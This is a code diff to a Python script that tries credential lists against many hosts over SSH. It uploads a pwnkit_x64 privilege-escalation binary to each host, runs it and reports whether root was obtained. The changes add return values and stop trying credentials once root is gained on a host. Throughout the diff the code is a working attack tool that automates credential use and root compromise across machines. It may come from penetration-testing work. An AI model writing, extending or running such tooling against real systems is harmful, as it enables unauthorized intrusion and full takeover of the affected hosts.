@@ -20,6 +20,9 @@ def read_config_file():
 	return parsed_config
 
 def check_login(ip_address, username, password):
+	"""
+	Returns True if we successfully got root, and returns False otherwise
+	"""
 	try:
 		logger.info(f"Connecting to {username}@{ip_address}...")
 		ssh_client = paramiko.SSHClient()
@@ -29,7 +32,7 @@ def check_login(ip_address, username, password):
 	except Exception as err:
 		logger.error(err)
 		logger.info(f"{COLOR_FAIL}Failed to connect to {username}@{ip_address}{COLOR_END}")
-		return
+		return False
 
 	logger.info("Copying pwnkit_x64 binary over SSH...")
 	sftp = ssh_client.open_sftp()
@@ -48,8 +51,10 @@ def check_login(ip_address, username, password):
 
 	if output_as_string == "root":
 		logger.info(f"{COLOR_OKGREEN}Successfully got root on {username}@{ip_address}{COLOR_END}")
+		return True
 	else:
 		logger.info(f"{COLOR_FAIL}Failed to get root, the system does not seem to be vulnerable{COLOR_END}")
+		return False
 
 def main():
 	config = read_config_file()
@@ -60,7 +65,9 @@ def main():
 	for ip in ips:
 		for credential in credentials:
 			try:
-				check_login(ip_address=ip, username=credential["username"], password=credential["password"])
+				got_root = check_login(ip_address=ip, username=credential["username"], password=credential["password"])
+				if got_root:
+					break
 			except Exception as err:
 				logger.exception(err)
 
